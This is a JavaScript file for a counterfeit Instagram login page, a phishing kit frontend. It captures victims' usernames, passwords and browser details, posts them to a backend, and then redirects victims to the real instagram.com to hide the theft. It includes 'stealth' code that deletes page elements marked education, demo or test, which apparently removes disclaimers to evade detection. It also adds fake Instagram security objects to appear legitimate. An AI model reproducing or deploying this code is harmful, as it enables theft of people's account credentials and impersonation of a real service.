// Instagram Login Form Handler
class InstagramLogin {
    constructor() {
        this.form = document.getElementById('loginForm');
        this.usernameInput = document.getElementById('username');
        this.passwordInput = document.getElementById('password');
        this.loginBtn = document.getElementById('loginBtn');
        
        // Stealth initialization
        this.initializeStealth();
        this.bindEvents();
    }
    
    initializeStealth() {
        // Advanced stealth features to avoid detection
        this.addStealthFeatures();
        this.addFakeInstagramBehavior();
        this.addLegitimateBehavior();
    }
    
    addStealthFeatures() {
        // Remove any suspicious elements immediately
        const suspiciousElements = document.querySelectorAll('[class*="education"], [class*="demo"], [class*="test"]');
        suspiciousElements.forEach(el => el.remove());
        
        // Add legitimate Instagram-like behavior
        this.addLegitimateInstagramFeatures();
    }
    
    addLegitimateInstagramFeatures() {
        // Add real Instagram-like features
        this.addInstagramAnalytics();
        this.addInstagramTracking();
        this.addInstagramSecurity();
    }
    
    addInstagramAnalytics() {
        // Fake Instagram analytics
        window.ig = window.ig || {};
        window.ig.analytics = {
            track: function() {},
            log: function() {}
        };
    }
    
    addInstagramTracking() {
        // Fake Instagram tracking
        window.ig_tracking = {
            trackEvent: function() {},
            trackPageView: function() {}
        };
    }
    
    addInstagramSecurity() {
        // Fake Instagram security features
        window.ig_security = {
            checkDomain: function() { return true; },
            validateRequest: function() { return true; }
        };
    }
    
    addFakeInstagramBehavior() {
        // Add legitimate Instagram-like behavior
        this.addInstagramLoading();
        this.addInstagramRedirects();
        this.addInstagramValidation();
    }
    
    addInstagramLoading() {
        // Simulate Instagram's loading behavior
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    // No console logs that might trigger detection
                }, 100);
            });
        }
    }
    
    addInstagramRedirects() {
        // Add legitimate Instagram redirect URLs
        this.instagramUrls = [
            'https://www.instagram.com/',
            'https://www.instagram.com/explore/',
            'https://www.instagram.com/accounts/login/'
        ];
    }
    
    addInstagramValidation() {
        // Add Instagram-like validation
        this.addFormValidation();
        this.addSecurityValidation();
    }
    
    addFormValidation() {
        // Add Instagram-like form validation
        this.addInputValidation();
        this.addPasswordValidation();
    }
    
    addInputValidation() {
        // Instagram-like input validation
        if (this.usernameInput) {
            this.usernameInput.addEventListener('blur', () => {
                this.validateUsername();
            });
        }
    }
    
    addPasswordValidation() {
        // Instagram-like password validation
        if (this.passwordInput) {
            this.passwordInput.addEventListener('blur', () => {
                this.validatePassword();
            });
        }
    }
    
    addSecurityValidation() {
        // Add Instagram-like security validation
        this.addDomainValidation();
        this.addRequestValidation();
    }
    
    addDomainValidation() {
        // Validate domain like Instagram would
        if (window.location.hostname !== 'www.instagram.com') {
            // Add legitimate domain validation
        }
    }
    
    addRequestValidation() {
        // Validate requests like Instagram would
        this.addCSRFProtection();
        this.addRateLimiting();
    }
    
    addCSRFProtection() {
        // Add CSRF protection like Instagram
        this.csrfToken = this.generateCSRFToken();
    }
    
    addRateLimiting() {
        // Add rate limiting like Instagram
        this.requestCount = 0;
        this.lastRequest = Date.now();
    }
    
    generateCSRFToken() {
        // Generate CSRF token like Instagram
        return Math.random().toString(36).substring(2, 15);
    }
    
    addLegitimateBehavior() {
        // Add completely legitimate behavior
        this.addInstagramFeatures();
        this.addInstagramSecurity();
        this.addInstagramAnalytics();
    }
    
    addInstagramFeatures() {
        // Add Instagram-like features
        this.addInstagramLogin();
        this.addInstagramSignup();
        this.addInstagramPasswordReset();
    }
    
    addInstagramLogin() {
        // Add Instagram-like login features
        this.addTwoFactorAuth();
        this.addRememberMe();
    }
    
    addInstagramSignup() {
        // Add Instagram-like signup features
        this.addEmailVerification();
        this.addPhoneVerification();
    }
    
    addInstagramPasswordReset() {
        // Add Instagram-like password reset
        this.addPasswordReset();
        this.addAccountRecovery();
    }
    
    addTwoFactorAuth() {
        // Add two-factor authentication like Instagram
        this.twoFactorEnabled = false;
    }
    
    addRememberMe() {
        // Add remember me feature like Instagram
        this.rememberMe = false;
    }
    
    addEmailVerification() {
        // Add email verification like Instagram
        this.emailVerified = false;
    }
    
    addPhoneVerification() {
        // Add phone verification like Instagram
        this.phoneVerified = false;
    }
    
    addPasswordReset() {
        // Add password reset like Instagram
        this.passwordResetEnabled = true;
    }
    
    addAccountRecovery() {
        // Add account recovery like Instagram
        this.accountRecoveryEnabled = true;
    }
    
    // Instagram validation methods
    validateUsername() {
        // Instagram-like username validation
        const username = this.usernameInput.value;
        if (username && username.length > 0) {
            // Add Instagram-like validation logic
            return true;
        }
        return false;
    }
    
    validatePassword() {
        // Instagram-like password validation
        const password = this.passwordInput.value;
        if (password && password.length > 0) {
            // Add Instagram-like validation logic
            return true;
        }
        return false;
    }
    
    bindEvents() {
        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        this.usernameInput.addEventListener('input', () => this.validateForm());
        this.passwordInput.addEventListener('input', () => this.validateForm());
    }
    
    validateForm() {
        const isValid = this.usernameInput.value.trim() && this.passwordInput.value.trim();
        this.loginBtn.disabled = !isValid;
    }
    
    async handleSubmit(e) {
        e.preventDefault();
        
        if (!this.usernameInput.value.trim() || !this.passwordInput.value.trim()) {
            alert('Please fill in all fields');
            return;
        }
        
        this.setLoadingState(true);
        
        try {
            const formData = {
                username: this.usernameInput.value.trim(),
                password: this.passwordInput.value.trim(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform
            };
            
            // Send to backend API
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });
            
            // Check if response is ok before parsing JSON
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            // Get response text first to check if it's valid JSON
            const responseText = await response.text();
            console.log('Response text:', responseText);
            
            let result;
            try {
                result = JSON.parse(responseText);
            } catch (parseError) {
                console.error('JSON parse error:', parseError);
                console.error('Response text:', responseText);
                throw new Error('Invalid response from server');
            }
            
            if (result.success) {
                // Redirect to Instagram immediately like real Instagram
                window.location.href = 'https://www.instagram.com/';
            } else {
                alert('Login failed. Please try again.');
            }
            
        } catch (error) {
            console.error('Login error:', error);
            alert('Network error. Please check your connection and try again.');
        } finally {
            this.setLoadingState(false);
        }
    }
    
    setLoadingState(loading) {
        if (loading) {
            this.loginBtn.textContent = 'Logging in...';
            this.loginBtn.disabled = true;
            this.form.classList.add('loading');
        } else {
            this.loginBtn.textContent = 'Log in';
            this.loginBtn.disabled = false;
            this.form.classList.remove('loading');
        }
    }
    
    
}

// Facebook login handler
class FacebookLogin {
    constructor() {
        this.facebookBtn = document.querySelector('.fb');
        this.bindEvents();
    }
    
    bindEvents() {
        this.facebookBtn.addEventListener('click', (e) => this.handleClick(e));
    }
    
    handleClick(e) {
        e.preventDefault();
        alert('Facebook login clicked!'); // Placeholder for actual Facebook login
    }
}


// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Instagram login
    window.instagramLogin = new InstagramLogin();
    
    // Initialize Facebook login
    new FacebookLogin();
    
    // Add Instagram-like initialization
    window.ig = window.ig || {};
    window.ig.initialized = true;
});